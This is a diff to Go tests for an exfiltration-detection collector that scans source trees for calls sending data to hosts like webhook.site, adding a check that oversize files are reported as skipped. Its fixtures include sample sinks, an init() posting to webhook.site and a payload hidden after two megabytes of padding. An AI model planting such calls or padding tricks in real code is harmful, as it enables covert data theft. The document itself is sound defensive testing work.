@@ -6,6 +6,7 @@ import (
 	"errors"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -69,9 +70,10 @@ func TestCollector_CleanTree_EmitsEmptySignal(t *testing.T) {
 	assert.Equal(t, profile.ForgeryHigh, sig.ForgeryResistance)
 	assert.Equal(t, "repo:github/test/repo", sig.EntityID)
 
-	var hits []exfilwatch.Hit
-	require.NoError(t, json.Unmarshal(sig.Value, &hits))
-	assert.Empty(t, hits)
+	var res exfilwatch.Result
+	require.NoError(t, json.Unmarshal(sig.Value, &res))
+	assert.Empty(t, res.Hits)
+	assert.Empty(t, res.Skipped)
 }
 
 // TestCollector_DirtyTree_EmitsHits — webhook.site in init.go fires
@@ -90,13 +92,44 @@ func TestCollector_DirtyTree_EmitsHits(t *testing.T) {
 	require.Len(t, result.Collected, 1)
 
 	sig := result.Collected[0].ToSignal()
-	var hits []exfilwatch.Hit
-	require.NoError(t, json.Unmarshal(sig.Value, &hits))
+	var res exfilwatch.Result
+	require.NoError(t, json.Unmarshal(sig.Value, &res))
 
-	require.Len(t, hits, 1)
-	assert.Equal(t, "webhook.site", hits[0].Host)
-	assert.Equal(t, "init.go", hits[0].File)
-	assert.Equal(t, 2, hits[0].Line)
+	require.Len(t, res.Hits, 1)
+	assert.Equal(t, "webhook.site", res.Hits[0].Host)
+	assert.Equal(t, "init.go", res.Hits[0].File)
+	assert.Equal(t, 2, res.Hits[0].Line)
+	assert.Empty(t, res.Skipped, "no oversize files, so no skips recorded")
+}
+
+// TestCollector_OversizeFile_RecordsSkipInSignal — an oversize file is
+// not scanned (it would buffer whole and exhaust memory), but the skip
+// must be surfaced in the signal payload, not silently dropped: a sink
+// hidden in a file too large to scan has to show up as a recorded gap so
+// an analyst can see what was not examined. A normal file in the same
+// tree is still scanned.
+func TestCollector_OversizeFile_RecordsSkipInSignal(t *testing.T) {
+	t.Parallel()
+
+	root := t.TempDir()
+	oversize := strings.Repeat("a", 2<<20) + "post(\"https://webhook.site/evil\")"
+	require.NoError(t, os.WriteFile(filepath.Join(root, "huge.min.js"), []byte(oversize), 0o644))
+	require.NoError(t, os.WriteFile(filepath.Join(root, "init.go"),
+		[]byte("func init() { post(\"https://webhook.site/abc\") }\n"), 0o644))
+
+	c := exfilwatch.NewCollector(root)
+	result, err := c.Collect(context.Background(), &profile.Entity{ID: "e1"})
+	require.NoError(t, err)
+	require.Len(t, result.Collected, 1)
+
+	var res exfilwatch.Result
+	require.NoError(t, json.Unmarshal(result.Collected[0].ToSignal().Value, &res))
+
+	require.Len(t, res.Hits, 1, "the normal file must still be scanned")
+	assert.Equal(t, "init.go", res.Hits[0].File)
+	require.Len(t, res.Skipped, 1, "the oversize file's skip must be recorded in the signal")
+	assert.Equal(t, "huge.min.js", res.Skipped[0].File)
+	assert.Equal(t, exfilwatch.SkipTooLarge, res.Skipped[0].Reason)
 }
 
 func TestCollector_NilEntity_ReturnsEmptyResult(t *testing.T) {
